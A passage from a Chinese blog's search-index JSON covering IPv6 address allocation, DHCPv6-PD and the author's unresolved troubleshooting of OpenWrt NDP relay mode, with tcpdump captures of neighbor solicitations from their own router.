</ul>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u4e0d\u540cos-ipv6\u5730\u5740\u5206\u914d\u65b9\u5f0f","title":"\u4e0d\u540cOS ipv6\u5730\u5740\u5206\u914d\u65b9\u5f0f","text":"<p>IPv6 Address Allocation Is Operating System-Specific \u00ab ipSpace.net blog</p> <p>\u4e09\u79cd\u4e0d\u540c\u5730\u5740\u5206\u914d\u65b9\u5f0f - \u9759\u6001\u8bbe\u7f6e - DHCPv6\uff0c\u5728RA\u62a5\u6587\u4e2d\uff0cM(Managed configuration) flag\u8bbe\u7f6e\uff0c\u8868\u793aclient\u53ef\u4ee5\u53d1\u8d77DHCPv6\u6765\u83b7\u5f97ipv6\u5730\u5740 - SLAAC\uff0cRA\u62a5\u6587\u4e2d\uff0cA(auto configuration) flag\u8bbe\u7f6e\uff0c\u8bbe\u5907\u901a\u8fc7prefix\u548c\u81ea\u5df1MAC\u5730\u5740\uff08\u6216\u8005\u8fd8\u6709\u968f\u673a\u6570\uff09\u751f\u6210ipv6\u5730\u5740\u3002</p> <p>\u4e0d\u901a\u64cd\u4f5c\u7cfb\u7edf\u6709\u4e0d\u901a\u7b56\u7565 - android\u4e0d\u652f\u6301DHCPv6\uff0c\u65e0\u8bbaM\u662f\u5426\u8bbe\u7f6e\uff0c\u4e5f\u4e0d\u4f1a\u53d1\u8d77DHCP request\u3002 - windows\u5c3d\u53ef\u80fd\u83b7\u5f97\u591a\u7684\u5730\u5740\u3002\u5373\u4f7f\u624b\u52a8\u8bbe\u7f6e\u4e86\u9759\u6001\u5730\u5740\uff0c\u4e5f\u4f1a\u83b7\u5f97DHCP\u5730\u5740\u548cSLAAC\u5730\u5740\u3002   - \u8981\u60f3\u53ea\u6709\u4e00\u4e2a\u5730\u5740\uff0c\u53ef\u4ee5\u5c06M flag\u5173\u95ed\uff0c\u8fd9\u6837windows\u5c31\u53ea\u6709SLAAC\u5730\u5740\u3002\u800c\u5982\u679c\u628aA\u5173\u95ed\uff0c\u90a3\u4e48\u5b89\u5353\u8bbe\u5907\u5c31\u65e0\u6cd5\u4f7f\u7528\u4e86\u3002 Other operating systems grab all they can: Windows will happily ask for a DHCPv6-assigned address whenever it receives an RA message with the M flag set regardless of whether it already has a static IPv6 address, and will add an autoconfigured address to the mix if the prefixes in the RA messages have the A flag set regardless of whether it already got static and/or DHCPv6-assigned addresses.</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#dhcpv6-pd","title":"DHCPv6-PD","text":"<p>\u4ec0\u4e48\u662fDHCPv6-PD \u2013 \u90b9\u5764\u4e2a\u4eba\u535a\u5ba2 (z0ukun.com)</p> <p>DHCPv6-PD\u662fDHCPv6\u7684\u4e00\u4e2a\u6269\u5c55\u529f\u80fd\u3002\u4e0d\u540c\u4e8eDHCPv6\u7528\u4e8e\u7533\u8bf7ipv6\u5730\u5740\uff0cDHCPv6\u7528\u4e8e\u7533\u8bf7\u4e00\u4e2asubnet\u5730\u5740\u3002\u4e00\u822cISP\u8fb9\u7f18\u8def\u7531\u5668(provider edge)\u662fdhcpv6-pd server\u3002\u800c\u7528\u6237\u7684\u76f4\u8fde\u8def\u7531\u5668\u662fdhcpv6-pd client\u3002</p> <p>\u7528\u6237\u8def\u7531\u5668\u83b7\u5f97\u4e00\u4e2a\u524d\u7f00\u540e\uff0c\u53ef\u4ee5\u81ea\u5df1\u518d\u901a\u8fc7SLAAC\u914d\u7f6e\u4e0b\u9762\u7684\u8bbe\u5907\u3002</p> <p>\u524d\u9762\u6211\u4eec\u4ecb\u7ecd\u7684\u90fd\u662fIPv6\u73af\u5883\u4e0b\u7684\u5730\u5740\u81ea\u52a8\u914d\u7f6e\u6280\u672f\uff0c\u5176\u5730\u5740\u914d\u7f6e\u6a21\u5f0f\u91c7\u7528\u7684\u662f\u201c\u5ba2\u6237\u673a-\u670d\u52a1\u5668\u201d\u6216\u201c\u5ba2\u6237\u673a-\u4e2d\u7ee7\u4ee3\u7406-\u670d\u52a1\u5668\u201d\u6a21\u5f0f\uff0c\u8fd9\u4e5f\u662f\u5e38\u89c1\u7684\u5730\u5740\u914d\u7f6e\u6a21\u5f0f\uff0c\u670d\u52a1\u5668\u76f4\u63a5\u9762\u5bf9\u5ba2\u6237\u4e3b\u673a\u3002\u5728\u8fd9\u79cd\u6a21\u5f0f\u4e0b\uff0c\u5f53\u5ba2\u6237\u4e3b\u673a\u6bb5\u8d8a\u6765\u8d8a\u591a\u65f6\uff0c\u5730\u5740\u5206\u914d\u53ca\u7ba1\u7406\u4e0a\u5c31\u5bb9\u6613\u53d1\u751f\u51cc\u4e71\uff0c\u7279\u522b\u662f\u5bf9\u4e8e\u5b9e\u65bd\u4e86\u5c42\u6b21\u5316\u7f51\u7edc\u73af\u5883\u7684\u8fd0\u8425\u5546\uff0c\u7f51\u7edc\u6838\u5fc3\u5982\u679c\u76f4\u63a5\u9762\u5bf9\u7528\u6237\u4e3b\u673a\u7684\u5730\u5740\u5206\u914d\uff0c\u4e00\u65b9\u9762\u4e0e\u5c42\u6b21\u5316\u5730\u5740\u5206\u914d\u539f\u5219\u76f8\u6096\uff0c\u53e6\u4e00\u65b9\u9762\u4e5f\u4f1a\u589e\u52a0\u5730\u5740\u7ba1\u7406\u548c\u670d\u52a1\u5668\u7684\u8d1f\u62c5\u3002\u6b63\u56e0\u4e3a\u5982\u6b64\uff0cRFC3633\u4e2d\u5b9a\u4e49\u4e86\u4e00\u79cdDHCPv6-PD\u6a21\u5f0f\uff0c\u4e13\u95e8\u7528\u4e8e\u81ea\u52a8\u5206\u914d\u524d\u7f00\u3002</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u534f\u8bae\u8fc7\u7a0b","title":"\u534f\u8bae\u8fc7\u7a0b","text":"<p>1\uff0ePD\u5ba2\u6237\u7aef\u5411PD\u670d\u52a1\u5668\u53d1\u9001DHCPv6\u8bf7\u6c42\u62a5\u6587\uff0c\u6b64\u62a5\u6587\u643a\u5e26IA_PD\u9009\u9879\uff0c\u8868\u660e\u81ea\u5df1\u9700\u8981\u7533\u8bf7IPv6\u524d\u7f00\u3002 2\uff0ePD\u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u62a5\u6587\u540e\uff0c\u4ece\u81ea\u5df1\u7684\u524d\u7f00\u5217\u8868\u6c60\u4e2d\u53d6\u51fa\u53ef\u7528\u7684\u524d\u7f00\uff0c\u9644\u5e26\u5728IA_PD\u9009\u9879\u4e2d\uff0c\u56de\u590d\u7ed9PD\u5ba2\u6237\u7aef\u3002 3\uff0e\u524d\u7f00\u5206\u914d\u5230\u671f\u540e\uff0cPD\u5ba2\u6237\u7aef\u91cd\u65b0\u5411PD\u670d\u52a1\u5668\u53d1\u9001DHCPv6\u8bf7\u6c42\u62a5\u6587\uff0c\u8bf7\u6c42\u66f4\u65b0\u524d\u7f00\u3002 4\uff0ePD\u670d\u52a1\u5668\u91cd\u65b0\u4e3aPD\u5ba2\u6237\u7aef\u5206\u914d\u524d\u7f00\uff08\u5728\u539f\u6709\u524d\u7f00\u672a\u88ab\u5360\u7528\u7684\u60c5\u51b5\u4e0b\uff0c\u4e00\u822c\u5c31\u662f\u7eed\u79df\uff09\u3002 5\uff0ePD\u5ba2\u6237\u7aef\u9700\u8981\u91ca\u653e\u524d\u7f00\u65f6\uff0c\u5411PD\u670d\u52a1\u5668\u53d1\u9001\u5feb\u901f\u8bf7\u6c42\u62a5\u6587\uff0c\u4ee5\u91ca\u653e\u524d\u7f00\u3002 6\uff0ePD\u670d\u52a1\u5668\u63a5\u6536\u5feb\u901f\u8bf7\u6c42\u62a5\u6587\u540e\uff0c\u56de\u6536\u524d\u7f00\uff0c\u5e76\u5bf9PD\u5ba2\u6237\u7aef\u7684\u5feb\u901f\u8bf7\u6c42\u62a5\u6587\u8fdb\u884c\u56de\u5e94\u3002</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#relay\u4e0b\u8bbe\u5907\u9700\u8981ping\u4e0b\u8def\u7531\u5668\u624d\u80fd\u4e0a\u7f51","title":"relay\u4e0b\u8bbe\u5907\u9700\u8981ping\u4e0b\u8def\u7531\u5668\u624d\u80fd\u4e0a\u7f51","text":"","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u73b0\u8c61","title":"\u73b0\u8c61","text":"<p>lxd\u5bb9\u5668\u63a5\u5165br1\uff0c\u83b7\u5f97\u4e86\u5168\u5c40ipv6\u5730\u5740\uff0c\u4f46\u662f\u786e\u65e0\u6cd5\u8bbf\u95ee\u5916\u7f51</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u6b63\u5e38\u65f6","title":"\u6b63\u5e38\u65f6","text":"<ul> <li>\u521a\u5f00\u59cbop2 ip neigh\u6ca1\u6709\u5bb9\u5668\u5730\u5740</li> <li>\u5bb9\u5668ping 6.ipw.cn\u65f6\uff0cop2 ip neigh\u51fa\u73b0\u5bb9\u5668\u5730\u5740\u3002\u5e76\u4e14\u53ef\u4ee5ping\u901a<ul> <li>\u7ea640s\u4eceREACHABLE\u53d8\u4e3aSTALE\u3002\u7ea690s neigh\u6761\u76ee\u6d88\u5931\u3002</li> </ul> </li> </ul>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u4e0d\u6b63\u5e38\u65f6","title":"\u4e0d\u6b63\u5e38\u65f6","text":"<p>\u5728op2\u4e0aip -6 -statistics neigh flush dev eth1(lan\u63a5\u53e3)\u5c31\u53ef\u4ee5\u590d\u73b0 - \u5bb9\u5668\u65e0\u6cd5ping\u901a - \u6b64\u65f6op2\u4e0a\u6709\u4e00\u6761\u9519\u8bef\u7684neigh\u9879\uff0c\u663e\u793alxd\u5bb9\u5668\u4f4d\u4e8e\u8def\u7531\u5668wan\u53e3(eth0)\u3002\u72b6\u6001\u4e3aINCOMPLETE\u6216FAILED   - \u5982\u679cip6 ro get lxd\u5730\u5740\uff0c\u4e5f\u4f1a\u53d1\u73b0\u4f1a\u5339\u914d\u5230wan\u51fa\u53e3 <pre><code>root@op2 \u279c  ~ ip6 neigh |grep 34a0\n2001:da8:d800:611:216:3eff:fe75:34a0 dev eth0  INCOMPLETE\nfe80::216:3eff:fe75:34a0 dev eth1 lladdr 00:16:3e:75:34:a0 STALE\n</code></pre> - \u6b64\u65f6tcpdump op2 wan\u53e3\uff0c\u53ef\u4ee5\u6293\u5230op2 NS lxd\u5bb9\u5668\u7684\u5305\u3002\u4f46\u662f\u76d1\u63a7lan\u53e3\u5219\u6293\u4e0d\u5230\u3002 <pre><code>root@op2 \u279c  ~ tcpdump -i eth0 icmp6 |grep 34a0\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\n17:45:11.488397 IP6 2001:da8:d800:611:216:3eff:feb9:4ff6 &gt; ff02::1:ff75:34a0: ICMP6, neighbor solicitation, who has 2001:da8:d800:611:216:3eff:fe75:34a0, length 32\n17:45:12.497482 IP6 2001:da8:d800:611:216:3eff:feb9:4ff6 &gt; ff02::1:ff75:34a0: ICMP6, neighbor solicitation, who has 2001:da8:d800:611:216:3eff:fe75:34a0, length 32\n</code></pre> lan\u53e3\u53ea\u80fd\u6293\u5230fe80\u7684NS\u6d88\u606f <pre><code>#tianyi tcpdump\n17:42:14.961479 IP6 fe80::216:3eff:fe3d:6fdc &gt; fe80::216:3eff:fe75:34a0: ICMP6, neighbor solicitation, who has fe80::216:3eff:fe75:34a0, length 32\n17:42:14.961754 IP6 fe80::216:3eff:fe75:34a0 &gt; fe80::216:3eff:fe3d:6fdc: ICMP6, neighbor advertisement, tgt is fe80::216:3eff:fe75:34a0, length 24\n</code></pre></p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u5176\u5b83\u4eba\u7684\u7c7b\u4f3c\u95ee\u9898","title":"\u5176\u5b83\u4eba\u7684\u7c7b\u4f3c\u95ee\u9898","text":"<ul> <li>relay mode does not work \u00b7 Issue #37 \u00b7 openwrt/odhcpd (github.com)</li> <li>NDP relay not working because NDP proxy entries are not added \u00b7 Issue #92 \u00b7 openwrt/odhcpd (github.com)</li> </ul> <p>\u9047\u5230\u5b8c\u5168\u4e00\u6837\u73b0\u8c61\u7684  \u4f46\u662f\u8bbe\u7f6endproxy_slave\u540e\u4ecd\u7136\u4e0d\u884c</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u6293\u5305","title":"\u6293\u5305","text":"","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u9700\u8981\u5728\u5176\u5b83\u5730\u65b9ping-lan\u5185\u673a\u5668lan\u673a\u5668\u624d\u80fd\u4e0a\u7f51","title":"\u9700\u8981\u5728\u5176\u5b83\u5730\u65b9ping LAN\u5185\u673a\u5668\uff0cLAN\u673a\u5668\u624d\u80fd\u4e0a\u7f51","text":"<p>windows\u65e0\u6cd5\u4e0a\u7f51 \u8def\u7531\u5668\u5728wan\u53e3\u53d1\u9001NS\u8bf7\u6c42 <pre><code>root@op2 \u279c  ~ tcpdump -vvvv -ttt -i eth0 \"icmp6 and (ip6[40] == 136 or ip6[40] == 135)\" |grep b006\ntcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\n 00:00:00.418749 IP6 (hlim 255, next-header ICMPv6 (58) payload length: 32) 2001:da8:d800:611:6c4b:aaff:fe73:6e8c &gt; ff02::1:ff6f:b006: [icmp6 sum ok] ICMP6, neighbor solicitation, length 32, who has 2001:da8:d800:611:5168:422:546f:b006\n 00:00:00.641522 IP6 (hlim 255, next-header ICMPv6 (58) payload length: 32) 2001:da8:d800:611:6c4b:aaff:fe73:6e8c &gt; ff02::1:ff6f:b006: [icmp6 sum ok] ICMP6, neighbor solicitation, length 32, who has 2001:da8:d800:611:5168:422:546f:b006\n 00:00:00.259773 IP6 (hlim 255, next-header ICMPv6 (58) payload length: 32) 2001:da8:d800:611:6c4b:aaff:fe73:6e8c &gt; ff02::1:ff6f:b006: [icmp6 sum ok] ICMP6, neighbor solicitation, length 32, who has 2001:da8:d800:611:5168:422:546f:b006\n 00:00:00.133900 IP6 (hlim 255, next-header ICMPv6 (58) payload length: 32) 2001:da8:d800:611:6c4b:aaff:fe73:6e8c &gt; ff02::1:ff6f:b006: [icmp6 sum ok] ICMP6, neighbor solicitation, length 32, who has 2001:da8:d800:611:5168:422:546f:b006\n</code></pre></p> <p>win ping ipw\uff0c\u8def\u7531\u5668\u786e\u5b9e\u5c06icmp\u8f6c\u53d1\u51fa\u53bb\uff08\u6b64\u540ewin ip\u53d8\u4e3a8295\uff09\u3002pve\u4e0a\u6293bridge\uff0c\u6bcf\u6b21\u80fd\u770b\u5230\u4e24\u6761 <pre><code>root@tianyi \u279c  ~ tcpdump -tttt -i vmbr1 \"icmp6 and (ip6[40] == 128)\"\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on vmbr1, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n2023-07-19 17:07:45.544300 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 622, length 40\n2023-07-19 17:07:45.544339 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 622, length 40\n2023-07-19 17:07:50.540583 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 623, length 40\n2023-07-19 17:07:50.540620 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 623, length 40\n2023-07-19 17:07:55.545758 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 624, length 40\n2023-07-19 17:07:55.545797 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 624, length 40\n2023-07-19 17:08:00.553304 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 625, length 40\n</code></pre></p> <p>\u5728\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u8bbf\u95eewin ip6\uff0cmtr\uff0c\u7136\u540e\u5c31\u901a\u4e86 - \u4e2d\u95f4\u8def\u7531\u5668wan\u53e3\u5bf9win\u53d1\u8d77\u4e86icmp echo\uff0c\u4e0d\u77e5\u4e3a\u4ec0\u4e48\uff0c\u662fmtr\u7684\u539f\u56e0\uff1f   - \u8fd9\u91cc\u548c\u540e\u9762openwrt NDP proxy\u7684\u884c\u4e3a\u5bf9\u4e0a\u4e86\uff01\uff01\uff01\u3002WAN\u4e0a\u63a5\u6536\u5230\u5b66\u6821NS A\u7684\u8bf7\u6c42\uff0c\u4f1a\u5728LAN\u4e0a\u53d1icmp-echo\u8bf7\u6c42\u7ed9A\u3002\u53ef\u4ee5\u770b\u5230\u65f6\u95f4\u662f\u5bf9\u4e0a\u7684\u3002 - ustc\u57df\u540d\u90a3\u4e2a\u662fryzen\u7684ip <pre><code>root@tianyi \u279c  ~ tcpdump -tttt -i vmbr1 \"icmp6 and (ip6[40] == 128 or ip6[40]==129)\"\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on vmbr1, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n\n2023-07-19 17:11:45.547363 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 670, length 40\n2023-07-19 17:11:45.547401 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 670, length 40\n2023-07-19 17:11:50.459330 IP6 2001:da8:d800:611:6c4b:aaff:fe73:6e8c &gt; 2001:da8:d800:611:fc9b:d4ed:c9c8:8295: ICMP6, echo request, id 0, seq 0, length 8\n2023-07-19 17:11:50.543230 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 671, length 40\n2023-07-19 17:11:50.543270 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 671, length 40\n2023-07-19 17:11:50.882113 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2001:da8:d800:611:6c4b:aaff:fe73:6e8c: ICMP6, echo reply, id 0, seq 0, length 8\n2023-07-19 17:11:51.263499 IP6 2001:da8:d800:611:6c4b:aaff:fe73:6e8c &gt; 2001:da8:d800:611:fc9b:d4ed:c9c8:8295: ICMP6, echo request, id 0, seq 0, length 8\n2023-07-19 17:11:51.264817 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2001:da8:d800:611:6c4b:aaff:fe73:6e8c: ICMP6, echo reply, id 0, seq 0, length 8\n2023-07-19 17:11:51.908027 IP6 ustc.edu.cn &gt; 2001:da8:d800:611:fc9b:d4ed:c9c8:8295: ICMP6, echo request, id 23486, seq 33002, length 24\n2023-07-19 17:11:51.930865 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; ustc.edu.cn: ICMP6, echo reply, id 23486, seq 33021, length 24\n2023-07-19 17:11:51.996148 IP6 ustc.edu.cn &gt; 2001:da8:d800:611:fc9b:d4ed:c9c8:8295: ICMP6, echo request, id 23486, seq 33022, length 24\n2023-07-19 17:11:51.997453 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; ustc.edu.cn: ICMP6, echo reply, id 23486, seq 33022, length 24\n2023-07-19 17:11:52.425085 IP6 ustc.edu.cn &gt; 2001:da8:d800:611:fc9b:d4ed:c9c8:8295: ICMP6, echo request, id 23486, seq 33025, length 24\n2023-07-19 17:11:55.544792 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 672, length 40\n2023-07-19 17:11:55.592522 IP6 2402:4e00:1013:e500:0:9671:f018:4947 &gt; 2001:da8:d800:611:fc9b:d4ed:c9c8:8295: ICMP6, echo reply, id 1, seq 672, length 40\n2023-07-19 17:11:55.592560 IP6 2402:4e00:1013:e500:0:9671:f018:4947 &gt; 2001:da8:d800:611:fc9b:d4ed:c9c8:8295: ICMP6, echo reply, id 1, seq 672, length 40\n2023-07-19 17:11:56.550626 IP6 2001:da8:d800:611:fc9b:d4ed:c9c8:8295 &gt; 2402:4e00:1013:e500:0:9671:f018:4947: ICMP6, echo request, id 1, seq 673, length 40\n2023-07-19 17:11:56.598434 IP6 2402:4e00:1013:e500:0:9671:f018:4947 &gt; 2001:da8:d800:611:fc9b:d4ed:c9c8:8295: ICMP6, echo reply, id 1, seq 673, length 40\n</code></pre></p> <p>\u671f\u95f4\u8f6f\u8def\u7531\u4e0a\u7ec8\u4e8e\u6293\u5230school\u5bf9win\u516c\u7f51ip6\u53d1\u8d77NS\u8bf7\u6c42 - \u6bd4\u8f83\u795e\u5947\u7684\u662fop\u5bf9\u5176\u8fdb\u884c\u4e86\u56de\u5e94 <pre><code>2023-07-19 17:11:50.226090 IP6 2001:da8:d800:611::1 &gt; ff02::1:ffc8:8295: ICMP6, neighbor solicitation, who has 2001:da8:d800:611:fc9b:d4ed:c9c8:8295, length 32\n2023-07-19 17:11:51.263290 IP6 2001:da8:d800:611::1 &gt; ff02::1:ffc8:8295: ICMP6, neighbor solicitation, who has 2001:da8:d800:611:fc9b:d4ed:c9c8:8295, length 32\n2023-07-19 17:11:51.904962 IP6 2001:da8:d800:611:6c4b:aaff:fe73:6e8c &gt; 2001:da8:d800:611::1: ICMP6, neighbor advertisement, tgt is 2001:da8:d800:611:fc9b:d4ed:c9c8:8295, length 32\n</code></pre></p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u672a\u89e3\u4e4b\u8c1c","title":"\u672a\u89e3\u4e4b\u8c1c","text":"<p>\u6298\u817e\u4e86\u5f88\u4e45\uff0c\u8fd8\u662f\u6ca1\u80fd\u89e3\u51b3\u3002\u56e0\u6b64\u603b\u7ed3\u4e0b\u76ee\u524d\u9047\u5230\u7684\u72b6\u51b5\u3002\u8fdf\u65e9\u6709\u4e00\u5929\u80fd\u591f\u7406\u89e3\u8fd9\u91cc\u7684\u95ee\u9898\u3002</p> <ul> <li>\u73b0\u5728\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u5ba2\u6237\u7aef\u5747\u80fd\u83b7\u5f97ipv6\uff0c\u4f46\u662f\u5c31\u662f\u4e0d\u901a\u7f51<ul> <li>\u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u5ba2\u6237\u7aefping \u8def\u7531\u5668wan\u53e3\uff0c\u5c31\u53ef\u4ee5\u4e0a\u7f51\u4e86\u3002</li> <li>\u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0cping wan\u53e3\u8fd8\u662f\u4e0d\u884c\uff0c\u6b64\u65f6\u8def\u7531\u5668\u662f\u53ef\u4ee5ping\u5ba2\u6237\u7aef\u7684\u3002\u4e5f\u5c06echo\u4ecewan\u53e3\u8def\u7531\u51fa\u53bb\u4e86\uff0c\u4f46\u662f\u6536\u4e0d\u5230reply\u3002\u6b64\u65f6\u5982\u679c\u5728\u5916\u7f51ping\u4e00\u4e0b\u5ba2\u6237\u7aef\u7684ipv6\u5730\u5740\uff08\u786e\u5b9e\u80fdping\u901a\uff09\uff0c\u5ba2\u6237\u7aef\u4e0a\u7f51\u5c31\u6b63\u5e38\u4e86\u3002</li> </ul> </li> </ul> <p>\u5bf9\u5e94\u7b2c\u4e00\u79cd\u60c5\u51b5\u7684\u95ee\u9898\uff1a - \u8def\u7531\u5668\u4e3a\u4ec0\u4e48ping\u4e0d\u901alan\u4e0bwindows\u7684ip6\u5730\u5740\uff08\u4e34\u65f6\u7684\u968f\u673a\u5730\u5740\u548c\u9759\u6001\u7684\uff09   - \u4e3a\u4ec0\u4e48\u8def\u7531\u5668\u4e0aping lan\u5185win11ipv6\u5730\u5740\u65f6\uff0c\u5411wan\u53e3\u53d1\u9001NS\u62a5\u6587\uff0c\u5374\u4e0d\u5411lan\u53e3\u53d1     - \u8def\u7531\u5668\u5728arp\u4e00\u4e2aipv6\u5730\u5740\u65f6\uff0c\u5982\u4f55\u9009\u62e9\u591a\u64ad\u7684\u63a5\u53e3\u5462\uff1f\u7167\u7406\u6765\u8bf4\u5e94\u8be5\u662flink local scope\u7684\u63a5\u53e3\u3002\u4f46\u662f\u8fd9\u91cc\u4e24\u4e2a\u63a5\u53e3\u5e94\u8be5\u90fd\u662flink-local\u7684\uff1f\u4f46\u662f\u8fd9\u662f\u4e0d\u662f\u548cwan\u548clan\u7684\u9694\u79bb\u6027\u51b2\u7a81\u5462\uff1f</p> <p>\u5bf9\u4e8e\u7b2c\u4e8c\u79cd\u60c5\u51b5\u7684\u95ee\u9898 openwrt NDP-Proxy relay\u6a21\u5f0f\u7684\u8bf4\u660e\uff1a</p> <p>Forward\u00a0NDP\u00a0NS\u00a0and\u00a0NA\u00a0messages between the designated master interface and downstream interfaces. - windows\u7f51\u5361\u542f\u52a8\u5e76\u914d\u7f6e\u5b8c\u4e00\u4e2a\u9759\u6001\u5730\u5740\u548c\u4e00\u4e2a\u968f\u673a\u5730\u5740\u540e\uff0c\u4f1a\u53d1\u9001NA\u62a5\u6587\uff0c\u5e7f\u64ad\u7ed9\u6240\u6709\u8282\u70b9\u3002\u90a3\u4e48\u8def\u7531\u5668\u6709\u5c06\u5176\u8f6c\u53d1\u7ed9wan\u53e3\u5417\uff1f - \u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u662f\u4e0d\u662f\u5b66\u6821\u7684\u8def\u7531\u5668\u5c31\u4e0d\u77e5\u9053win11\u7684\u5b58\u5728\uff0c\u5728\u8f6c\u53d1echo\u8bf7\u6c42\u65f6\uff0c\u53d1\u73b0ipv6\u5730\u5740\u6ca1\u6709\u8bb0\u5f55\uff0c\u5c31\u76f4\u63a5\u4e22\u6389\u4e86\uff1f\uff08ipv4\u5bdd\u5ba4\u56fe\u4e66\u9986\u4e4b\u7c7b\u7684\u516c\u5171\u573a\u6240\u4e0a\u6e38\u6709 BRAS\uff0c\u5fc5\u987b\u89e6\u53d1\u8ba4\u8bc1\u624d\u4f1a\u628a v4 